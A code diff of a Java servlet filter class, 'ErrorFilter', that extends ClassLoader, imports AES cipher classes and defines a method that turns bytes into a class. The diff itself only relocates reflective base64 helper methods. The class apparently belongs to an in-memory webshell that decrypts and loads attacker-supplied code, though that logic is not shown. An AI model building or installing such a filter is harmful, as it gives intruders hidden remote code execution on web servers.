@@ -1,4 +1,3 @@
-
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.*;
@@ -24,6 +23,44 @@ public class ErrorFilter extends ClassLoader implements Filter {
 
     public ErrorFilter(ClassLoader var1) {
         super(var1);
+    }
+
+    public static String base64Encode(byte[] bs) throws Exception {
+        String value = null;
+
+        try {
+            Class<?> base64 = Class.forName("java.util.Base64");
+            Object encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
+            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
+        } catch (Exception var61) {
+            try {
+                Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
+                Object encoder = base64.newInstance();
+                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
+            } catch (Exception var5) {
+            }
+        }
+
+        return value;
+    }
+
+    public static byte[] base64Decode(String bs) {
+        byte[] value = null;
+
+        try {
+            Class<?> base64 = Class.forName("java.util.Base64");
+            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
+            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
+        } catch (Exception var61) {
+            try {
+                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
+                Object decoder = base64.newInstance();
+                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
+            } catch (Exception var5) {
+            }
+        }
+
+        return value;
     }
 
     public Class<?> Q(byte[] cb) {
@@ -87,43 +124,5 @@ public class ErrorFilter extends ClassLoader implements Filter {
     @Override
     public void destroy() {
 
-    }
-
-    public static String base64Encode(byte[] bs) throws Exception {
-        String value = null;
-
-        try {
-            Class<?> base64 = Class.forName("java.util.Base64");
-            Object encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
-            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
-        } catch (Exception var61) {
-            try {
-                Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
-                Object encoder = base64.newInstance();
-                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
-            } catch (Exception var5) {
-            }
-        }
-
-        return value;
-    }
-
-    public static byte[] base64Decode(String bs) {
-        byte[] value = null;
-
-        try {
-            Class<?> base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
-            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
-        } catch (Exception var61) {
-            try {
-                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception var5) {
-            }
-        }
-
-        return value;
     }
 }
